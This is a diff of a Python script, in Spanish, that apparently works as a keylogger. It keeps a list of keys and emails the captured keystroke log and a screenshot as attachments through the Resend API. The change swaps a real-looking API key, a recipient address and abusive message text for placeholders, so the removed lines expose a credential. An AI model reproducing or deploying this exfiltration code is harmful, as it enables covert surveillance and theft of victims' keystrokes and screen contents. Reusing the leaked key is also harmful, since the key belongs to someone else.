@@ -7,7 +7,7 @@ import pyautogui
 import resend
 
 # Configuración de la API Key de resend
-resend.api_key = "re_cWnAMYCk_6sh64AgK4E7BnkGGE2PtNNti"
+resend.api_key = "re_NUMERO_API_238713RFWWGWGWE8GG8EG7"
 
 count = 0
 keys = []
@@ -115,10 +115,10 @@ def send_email():
         encoded_img = base64.b64encode(img_content).decode('utf-8')
 
     params = {
-        "from": "Jacky Sieras Tu <joselitog@resend.dev>",
-        "to": ["buajajajajajajajajajaja@gmail.com"],
-        "subject": "Archivo confidencial JU3PUT4 !! (bkp.my.cpu)",
-        "text": "M4R1C4 jU3PUT4 AQUÍ TIENES miS COjON35 PUEST05 EN bANDEJA. tE MANDO ESTA MI3RDA. eSPERO QUE LA DISFRUTES MAR1C4 :D.",
+        "from": " <nameg@resend.dev>",
+        "to": ["your@mail.com"],
+        "subject": "Archivos confidenciales",
+        "text": "Buenas tardes, Con el presente les adjunto unos archivos interesantes. Saludos",
         "attachments": [
             {"filename": "log.txt", "content": encoded_content},
             {"filename": "screenshot.png", "content": encoded_img},
